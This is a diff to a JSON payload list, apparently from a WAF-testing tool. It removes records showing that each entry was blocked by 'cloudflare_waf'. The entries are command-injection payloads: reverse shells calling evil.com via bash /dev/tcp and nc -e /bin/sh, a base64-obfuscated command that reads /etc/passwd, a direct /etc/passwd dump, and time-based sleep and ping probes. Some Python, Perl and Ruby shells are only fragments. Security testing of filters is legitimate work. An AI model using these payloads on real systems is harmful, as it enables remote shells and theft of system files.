@@ -10,12 +10,7 @@
       "payload": "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
       "description": "Bash reverse shell",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1002",
@@ -24,12 +19,7 @@
       "payload": "; nc -e /bin/sh evil.com 4444",
       "description": "Netcat reverse shell",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1003",
@@ -38,12 +28,7 @@
       "payload": "; python -c 'import socket,subprocess,os;s=socket.socket()'",
       "description": "Python reverse shell",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1004",
@@ -52,12 +37,7 @@
       "payload": "; perl -e 'use Socket;'",
       "description": "Perl reverse shell",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1005",
@@ -66,12 +46,7 @@
       "payload": "; ruby -rsocket -e 'exit if fork'",
       "description": "Ruby reverse shell",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1006",
@@ -80,12 +55,7 @@
       "payload": "; $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
       "description": "Base64 encoded command",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1007",
@@ -94,12 +64,7 @@
       "payload": "; `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",
       "description": "Backtick base64",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1008",
@@ -108,12 +73,7 @@
       "payload": "; cat /etc/passwd | base64",
       "description": "Output encoding",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1009",
@@ -122,12 +82,7 @@
       "payload": "; sleep 5 && echo done",
       "description": "Time-based sleep",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "command_injection-1010",
@@ -136,12 +91,7 @@
       "payload": "; ping -c 5 127.0.0.1",
       "description": "Time-based ping",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     }
   ]
 }
